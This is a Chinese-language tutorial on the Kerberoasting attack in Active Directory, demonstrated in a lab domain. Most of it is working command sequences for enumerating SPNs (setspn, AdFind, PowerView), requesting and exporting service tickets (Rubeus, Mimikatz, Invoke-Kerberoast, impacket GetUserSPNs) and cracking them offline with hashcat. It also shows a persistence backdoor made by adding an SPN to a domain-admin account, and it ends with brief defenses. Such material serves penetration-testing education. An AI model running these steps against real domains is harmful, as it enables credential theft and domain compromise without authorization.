# 前言
Kerberoast 攻击是域内渗透中经常使用的一种技术，主要通过利用 Kerberos 协议的特定阶段和加密算法的弱点，尝试破解域内服务的密码。利用前提：获取了一个普通域用户凭据。
> 使用域账户向KDC请求一个服务票据ST，由于ST是服务器账号的NTLM hash加密的，所以可以通过模拟加密过程然后将结果与ST比较，相同的话就能获取高权限域用户的密码。前提是这个服务以高权限的域用户运行，并且该 SPN 被注册在域用户账户下。

# Kerberoast 攻击原理
Kerberoast 攻击主要利用了 Kerberos 协议中的服务票据（Service Ticket，简称 ST）生成和分发过程。具体来说，攻击原理可以分为以下几个步骤：

1. **获取 TGT（Ticket-Granting Ticket）**：
   - 攻击者首先使用一个有效的域用户凭证（用户名和密码）向 KDC 发起请求，获取一个 TGT。这个 TGT 是用于后续请求服务票据的“入场券”。
2. **请求 ST（Service Ticket）**：
   - 攻击者使用 TGT 向 KDC 发起请求，针对特定的服务主体名称（SPN）请求一个 ST。SPN 是服务的唯一标识符，用于在 Kerberos 环境中标识服务。
   - 在这个过程中，KDC 会检查 TGT 的有效性，并生成一个 ST。这个 ST 是用目标服务账户的 NTLM hash 加密的，加密算法通常为 RC4-HMAC。
3. **离线爆破 ST**：
   - 攻击者获取到 ST 后，会尝试使用穷举法（即尝试不同的密码）来模拟加密过程，生成与 ST 相同的加密结果。
   - 如果攻击者成功找到了与 ST 加密结果相匹配的密码，那么他们就破解了目标服务账户的明文密码。
# 为什么能进行 Kerberoast 攻击

- **加密算法弱点**：Kerberos 在 TGS_REP 阶段使用的 RC4-HMAC 加密算法相对容易被破解，因为攻击者可以在本地进行离线爆破，不需要与服务器进行实时交互。
- **SPN 的重要性**：SPN 是服务的唯一标识符，如果服务以高权限的域用户账户运行，并且该 SPN 被注册在域用户账户下，那么破解该 SPN 对应的 ST 就可能获得高权限账户的密码。
# SPN介绍
SPN（Service Principal Name，服务主体名称）是服务的唯一标识符。每个需使用Kerberos来进行身份验证的服务都需要一个SPN。SPN的存在有助于确保在Kerberos身份验证中能够正确地识别和授权服务。
SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下。

- 当一个服务的权限为Local System或Network Service，则SPN注册在机器帐户(Computers)下。
- 当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下。

kerberoast攻击主要利用注册在域用户帐户下的SPN，因为机器账户口令系统随机生成，几乎不可能破解，且机器账户无法远程连接，对攻击者无利用价值。
## SPN格式
一个SPN由服务类别（service class）和服务名称（service name）组成，其格式通常为：
> service_class/host:port/service_name

- service_class 是服务的类型，例如 HTTP、MSSQLSVC 等。
- host有两种形式，FQDN和NetBIOS名，例如server01.test.lab和server01
- 如果服务运行在默认端口上，则端口号(port)可以省略
- service_name 是服务的实际名称，例如 IIS 网站的名称。

在Active Directory中，可以使用setspn工具来管理和查询SPN。
## 域内查询SPN 
我们在普通域用户下进行SPN发现
### 使用setspn
windows系统自带的setspn可以查询域内的所有SPN。
```bash
#查看当前域内所有的SPN
setspn -Q */*
#-Q：这个开关与 setspn 一起使用，用于查询现有的SPN
#*/*：这是应用于查询的过滤器。在SPN的上下文中，通配符（*）用于匹配任何服务类别和任何服务名称。
#查看指定域注册的SPN，如果指定域不存在，则默认切换到查找本域的SPN
setspn -T test.lab -Q */*

#查找本域内重复的SPN
setspn -X

#删除指定SPN
setspn -D mysql/admin-PC.test.lab yuwin7

#查找指定用户/主机名注册的SPN：
setspn -L username/hostname
```
> C:\Users\test>setspn -Q */*
> 正在检查域 DC=test,DC=lab
> CN=DC,OU=Domain Controllers,DC=test,DC=lab
>         Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc.test.lab
>         ldap/dc.test.lab/ForestDnsZones.test.lab
>         ...
>         ldap/dc.test.lab
>         ldap/dc.test.lab/test.lab
> CN=krbtgt,CN=Users,DC=test,DC=lab
>         kadmin/changepw
> CN=test,CN=Users,DC=test,DC=lab
>         MySQL/test.lab:3306
> CN=WIN2012,CN=Computers,DC=test,DC=lab
>         WSMAN/win2012
>         ...
>         HOST/win2012.test.lab
> CN=ADMIN-PC,CN=Computers,DC=test,DC=lab
>         TERMSRV/ADMIN-PC
>         ...
>         HOST/ADMIN-PC.test.lab
> CN=WIN2012-2,CN=Computers,DC=test,DC=lab
>         WSMAN/win2012-2
>         WSMAN/win2012-2.test.lab
>         ...
>         HOST/win2012-2.test.lab

以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN
对于上面的输出数据，机器帐户(Computers)为：

- CN=DC,OU=Domain Controllers,DC=test,DC=lab
- CN=WIN2012,CN=Computers,DC=test,DC=lab
- CN=ADMIN-PC,CN=Computers,DC=test,DC=lab
- CN=WIN2012-2,CN=Computers,DC=test,DC=lab

域用户帐户(Users)为：

- CN=krbtgt,CN=Users,DC=test,DC=lab
- CN=test,CN=Users,DC=test,DC=lab

注册在域用户帐户(Users)下的SPN有两个：kadmin/changepw和MySQL/test.lab:3306
### GetUserSPNs.ps1
地址：[GetUserSPNs.ps1](https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1) 推荐
GetUserSPNs 是 Kerberoast 工具集中的一个 PowerShell 脚本，可以用来查询域内用户注册的SPN。
```bash
powershell -exec bypass import-module .\GetUserSPNs.ps1
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22971806/1700476469574-d5d3fde1-f799-4af5-9f65-1f4704891fe1.png#averageHue=%23030202&clientId=u8728d0f4-c22c-4&from=paste&height=232&id=uaa17cd04&originHeight=463&originWidth=1382&originalType=binary&ratio=2&rotation=0&showTitle=false&size=40433&status=done&style=none&taskId=u8ddfd3fe-9c80-4fe9-b15c-a834ea866b2&title=&width=691)
**GetUserSPNs.vbs**
[https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs](https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs)
```bash
cscript GetUserSPNs.vbs
```
### Rubeus.exe
```bash
Rubeus.exe kerberoast
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22971806/1700476211607-a4c7a42f-1caf-4713-8b87-41c248eca51e.png#averageHue=%23030202&clientId=u8728d0f4-c22c-4&from=paste&height=526&id=u16ae49e9&originHeight=1051&originWidth=1782&originalType=binary&ratio=2&rotation=0&showTitle=false&size=93643&status=done&style=none&taskId=uef952762-f0b7-438a-a321-666d4b9d63f&title=&width=891)
### PowerView.ps1
PowerView 是 PowerSploit 框架中 Recon 目录下的一个 PowerShell 脚本**，**PowerView 相对于上面几种是根据不同用户的 objectsid 来返回，返回的信息更加详细
```bash
Import-Module .\PowerView.ps1; Get-NetUser -SPN
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22971806/1700476557677-e05a8b7d-a235-427e-b25f-b77cc1e59975.png#averageHue=%23020201&clientId=u8728d0f4-c22c-4&from=paste&height=723&id=u7d0b0313&originHeight=1446&originWidth=2234&originalType=binary&ratio=2&rotation=0&showTitle=false&size=158044&status=done&style=none&taskId=u73c506b5-744f-4766-a934-44514b46a38&title=&width=1117)
# Kerberoast 攻击实验
## 准备环境：将服务注册到SPN
将服务注册到SPN（Service Principal Name）意味着为某个服务标识一个唯一的标识符，以便在Kerberos身份验证中进行正确的身份验证和授权。
**将服务注册到SPN的前置条件**

- 确定服务登录账户：确定服务将在哪个用户或计算机账户下运行。
- 管理员权限：通常，SPN的注册需要域管理员权限。默认本地账号和普通域账号不能直接注册SPN

实验环境：

- 域：test.lab
- 域控：192.168.10.2
- 域成员：yuwin2012（域管）、test（普通域用户）
- 获取的域内权限：filepc:filepc.com（普通域用户，被控制的机器）
1. 注册在域用户帐户(Users)下

登录域管理员yuwin2012，执行注册操作：将mysql服务注册到SPN，并指定服务的运行帐户分别为test和yuwin2012。指定服务运行账户为谁，后面攻击就获取谁的票据。
```bash
setspn -S 服务类别/域名:端口 子域名\服务运行的帐户的用户名
#服务运行的帐户的用户名。这个帐户通常是服务的服务账户，服务账户是专门为运行服务而创建的帐户。它不应该是一个普通用户帐户，而是应该具有适当的安全设置和权限。
setspn -S MySQL/test.lab:3306 test\test
setspn -S MySQL/test.lab:33306 test\yuwin2012

#删除指定SPN
将-A改为 -D
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/22971806/1723112874666-1d475ea1-4b4d-4e8f-91af-29e30fbb2139.png#averageHue=%23050403&clientId=ud9049ef5-2ee5-4&from=paste&height=103&id=u08b5acca&originHeight=206&originWidth=1208&originalType=binary&ratio=2&rotation=0&showTitle=false&size=21325&status=done&style=none&taskId=u1c3ec6c1-d72b-48e4-b61d-303679b18b5&title=&width=604)
运行完命令后，可以使用以下命令验证 SPN 是否正确注册：
```
setspn -Q MySQL/test.lab:3306
```
使用普通域账号登录后，执行注册spn因为权限不够，会显示拒绝访问。所以注册SPN需要域管理员权限
![image.png](https://cdn.nlark.com/yuque/0/2024/png/22971806/1723112890049-c959d608-091c-48a8-91b3-24131fbbb8d8.png#averageHue=%23040302&clientId=ud9049ef5-2ee5-4&from=paste&height=214&id=u8617e1ac&originHeight=427&originWidth=1252&originalType=binary&ratio=2&rotation=0&showTitle=false&size=42184&status=done&style=none&taskId=u896cbd11-2bbb-47ee-9f3b-229b74a164f&title=&width=626)
## 查找注册在域管下的SPN
可通过如下方式，查找注册在高权限域用户下的SPN
### AdFind.exe

1. 如果在域内，则无需提供域账号密码，可以直接查找注册在高权限域用户下的SPN
```bash
AdFind.exe -f "&(servicePrincipalName=*)(admincount=1)"  servicePrincipalName
```
获取了有高权限的域用户yuwin2012。对于注册在普通域用户下的SPN并未显示出来
![image.png](https://cdn.nlark.com/yuque/0/2024/png/22971806/1723113707671-9f04ebc0-ceac-46e5-9436-589a2d036610.png#averageHue=%23040302&clientId=ud9049ef5-2ee5-4&from=paste&height=234&id=u2e78f2e1&originHeight=468&originWidth=1664&originalType=binary&ratio=2&rotation=0&showTitle=false&size=46753&status=done&style=none&taskId=u588a6f12-5690-4610-9343-a54b469e1fd&title=&width=832)

2. 如果不在域内，但是拥有普通域账户并且能访问到域控，也可以查询
```bash
AdFind.exe -h 192.168.10.2:389 -u test\filepc -up filepc.com -f "&(servicePrincipalName=*)(admincount=1)"  servicePrincipalName
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/22971806/1723113772486-1a1e6059-7c4a-4caf-92fd-38308f789b89.png#averageHue=%233a3938&clientId=ud9049ef5-2ee5-4&from=paste&height=256&id=uef86ae64&originHeight=511&originWidth=2106&originalType=binary&ratio=2&rotation=0&showTitle=false&size=380561&status=done&style=none&taskId=u62b50ec1-c182-44a7-934c-87de08e7566&title=&width=1053)
### PowerView.ps1
```bash
Import-Module .\PowerView.ps1;Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/22971806/1723114210557-afba910d-18ae-4ec2-a2f5-5b0d7ce558bb.png#averageHue=%23050403&clientId=ud9049ef5-2ee5-4&from=paste&height=104&id=uf7523054&originHeight=207&originWidth=2110&originalType=binary&ratio=2&rotation=0&showTitle=false&size=28428&status=done&style=none&taskId=u82225b19-d25d-4e37-8ec0-6ced74dd23c&title=&width=1055)
### MAMdll
地址：[Microsoft.ActiveDirectory.Management.dll](https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll)
```bash
import-module .\Microsoft.ActiveDirectory.Management.dll; get-aduser -filter {AdminCount -eq 1 -and (servicePrincipalName -ne 0)} -prop * |select name,whencreated,pwdlastset,lastlogon
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22971806/1700539028168-d1a27c14-4c06-4efe-aa99-0864fdab5f07.png#averageHue=%23020101&clientId=ub2921268-6b32-4&from=paste&height=123&id=ue6a48a54&originHeight=245&originWidth=2191&originalType=binary&ratio=2&rotation=0&showTitle=false&size=19422&status=done&style=none&taskId=uae6bc41c-f7b0-458e-9846-bf66e1b62bd&title=&width=1095.5)
## 请求服务票据ST并离线爆破
### 使用Rubeus（推荐）
Rubeus 工具里面的 kerberoast 支持对所有用户或者特定用户执行 kerberoasting 操作，其原理在于先用 LDAP 查询域内的 SPN 服务主体名称，然后发送 TGS 包，最后直接打印出能使用 Hashcat 或 John 爆破的 Hash。默认情况下会打印出注册于用户下的所有 SPN 的服务票据的 Hashcat 格式

1. 请求并导出所有ST到hash.txt文件
```bash
Rubeus.exe kerberoast /format:hashcat /outfile:hash.txt
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/22971806/1723114619682-35032733-6920-4fb5-8bdf-3fbf8546ec52.png#averageHue=%234b4a49&clientId=ud9049ef5-2ee5-4&from=paste&height=572&id=ubeb9842d&originHeight=1143&originWidth=2375&originalType=binary&ratio=2&rotation=0&showTitle=false&size=273039&status=done&style=none&taskId=u20eac954-d1c4-431c-acb1-bcf1c9046e5&title=&width=1187.5)

2. 使用hashcat对ST进行离线爆破
```bash
hashcat -m 13100  hash.txt  pass.txt --force
```
如下，成功爆破出这两个服务运行的帐户的明文密码
![image.png](https://cdn.nlark.com/yuque/0/2024/png/22971806/1723115033766-63f2ec99-0ff7-43f1-bafa-c5a9aab0dce4.png#averageHue=%232e3435&clientId=ud9049ef5-2ee5-4&from=paste&height=464&id=ub20e6404&originHeight=928&originWidth=2148&originalType=binary&ratio=2&rotation=0&showTitle=false&size=454977&status=done&style=none&taskId=u3749984b-b696-4bde-a5da-5f60fb4b265&title=&width=1074)
### 使用 Mimikatz 工具
域内执行

1. **请求并导出服务票据ST**
```bash
#请求并导出所有票据
mimikatz.exe "kerberos::list /export" exit
#清除所有票据
kerberos::purge
```
执行完后，会在mimikatz同目录下导出后缀为kirbi的票据文件。通过前面使用adfind找到了注册在域管下的SPN: MySQL/test.lab:33306，所以该票据为高价值票据
![image.png](https://cdn.nlark.com/yuque/0/2024/png/22971806/1723168721863-4963a147-9c5a-4670-a193-d9bd65efcf75.png#averageHue=%23edeae7&clientId=u0103fe87-4226-4&from=paste&height=106&id=u8378784f&originHeight=212&originWidth=867&originalType=binary&ratio=2&rotation=0&showTitle=false&size=23701&status=done&style=none&taskId=uec2a36a7-2044-454d-a833-0bc66b7e1d2&title=&width=433.5)

2. **破解ST票据hash**

使用[extractServiceTicketParts.py](https://github.com/leechristensen/tgscrack/blob/master/extractServiceTicketParts.py) 提取票据hash到hash.txt中
```bash
pip2 install pyasn1
python2 extractServiceTicketParts.py ../2-40a10000-filepc@MySQL\~test.lab\~33306-TEST.LAB.kirbi > hash.txt
```
使用 [tgscrack](https://github.com/leechristensen/tgscrack/releases/tag/0.0.1) 爆破hash
```bash
tgscrack.exe -hashfile hash.txt -wordlist pass.txt
```
获取了明文密码为yuwin2012.com
![image.png](https://cdn.nlark.com/yuque/0/2024/png/22971806/1723171468959-cd869707-6c95-46c3-a1bb-7f6284ede84e.png#averageHue=%23414141&clientId=uf2e50bbb-793d-4&from=paste&height=161&id=u969429a8&originHeight=321&originWidth=1646&originalType=binary&ratio=2&rotation=0&showTitle=false&size=147893&status=done&style=none&taskId=u8420e2e8-cd7f-47b3-b38e-65a9080b4f6&title=&width=823)
### 使用Invoke-Kerberoast.ps1
地址：[Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
Invoke-Kerberoast.ps1导出转换成 John the Ripper 或者 HashCat 能够直接爆破的字符串
```bash
powershell -exec bypass
Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation > hash3.txt
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/22971806/1723115268935-0c5649f5-d36a-4027-9c62-ee75118f7e79.png#averageHue=%23999796&clientId=ud9049ef5-2ee5-4&from=paste&height=241&id=u758771b4&originHeight=481&originWidth=1933&originalType=binary&ratio=2&rotation=0&showTitle=false&size=77627&status=done&style=none&taskId=u8ccceab9-259c-47d9-a8a8-e37ef6b2fd0&title=&width=966.5)
然后分别将引号内蓝色部分的hash提取出来放到hashcat中破解即可
![image.png](https://cdn.nlark.com/yuque/0/2024/png/22971806/1723115859204-5890290e-7436-4317-8f5d-8d863cd31e21.png#averageHue=%23dcdbd9&clientId=ud0c50cef-036c-4&from=paste&height=326&id=u246a0350&originHeight=652&originWidth=2231&originalType=binary&ratio=2&rotation=0&showTitle=false&size=117322&status=done&style=none&taskId=u49532552-f6a6-48ba-ac61-531fe028163&title=&width=1115.5)
破解
```bash
hashcat -m 13100 hash3.txt pass.txt --force
```
# 域外利用：查询高价值SPN并导出ST
假设当前环境在域外，但是获取了一个普通域账号。我们可以在域名查询SPN并导出ST票据。工具：[GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)

1. 该工具将会查找注册在域用户帐户下的SPN
```python
#windows可能报错获取不到票据，建议kali执行
#python3 GetUserSPNs.py -dc-ip ip 域名/普通域用户:密码
python3 GetUserSPNs.py -dc-ip 192.168.10.2 test.lab/filepc:filepc.com
```
Name为yuwin2012的MemberOf中显示Domain Admins，说明该域用户为域管理员
![image.png](https://cdn.nlark.com/yuque/0/2024/png/22971806/1723172510392-10748eef-362c-4d36-ae9f-b40c50c798e5.png#averageHue=%2333464a&clientId=uf2e50bbb-793d-4&from=paste&height=120&id=u36b89b37&originHeight=239&originWidth=2185&originalType=binary&ratio=2&rotation=0&showTitle=false&size=141932&status=done&style=none&taskId=u6d613338-1514-4eba-9df0-7a59a23c5ca&title=&width=1092.5)

2. 导出ST
```python
python3 GetUserSPNs.py -request -dc-ip 192.168.10.2 test.lab/filepc:filepc.com
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/22971806/1723172728337-e0f442c4-ca3d-4098-aacd-aa628fa3460a.png#averageHue=%233a4c52&clientId=uf2e50bbb-793d-4&from=paste&height=472&id=udcf5afe6&originHeight=943&originWidth=3071&originalType=binary&ratio=2&rotation=0&showTitle=false&size=631290&status=done&style=none&taskId=u39e07532-a4df-4b07-987c-3b06cd44ea6&title=&width=1535.5)
将上面hash保存到hash.txt中，使用hashcat爆破
```python
hashcat -m 13100  hash.txt  pass.txt --force
```
# Kerberoast 后门利用
在获得域管的权限后，可以为任意域用户如域管注册一个SPN，这样可以随时获得该域用户的ST
例如为域管yuwin2012添加SPN VNC/DC.test.lab，参数如下：
```bash
setspn -U -A VNC/DC.test.lab yuwin2012
```
请求ST
![image.png](https://cdn.nlark.com/yuque/0/2024/png/22971806/1723173949191-d4ae40f0-38d3-4d35-a8ee-ea94d746ac3e.png#averageHue=%2337494f&clientId=uf2e50bbb-793d-4&from=paste&height=305&id=u79220d9b&originHeight=609&originWidth=3055&originalType=binary&ratio=2&rotation=0&showTitle=false&size=421850&status=done&style=none&taskId=uc82791d8-1ba5-4c7e-a6f4-e1194047eba&title=&width=1527.5)
再使用hashcat破解即可获取yuwin2012的明文口令
```bash
hashcat -m 13100  hash.txt  pass.txt --force
```
当域管理员yuwin2012修改了密码，我们再请求其ST票据，该服务票据也会因为服务账号yuwin2012的密码修改和发生改变。所以如果密码本中没有该新密码信息，那么这ST也爆破不出来。
# Kerberoast 防御

- **强密码策略**：确保所有域用户账户都使用强密码，并定期更换密码。
- **限制 SPN 注册**：限制哪些账户可以注册 SPN，特别是高权限的域用户账户。
- **监控和审计**：对 Kerberos 票据的请求和分发进行监控和审计，及时发现异常行为。
- **网络隔离**：通过网络隔离措施减少攻击者在内网中的横向移动能力。

参考：[https://3gstudent.github.io/域渗透-Kerberoasting](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting)
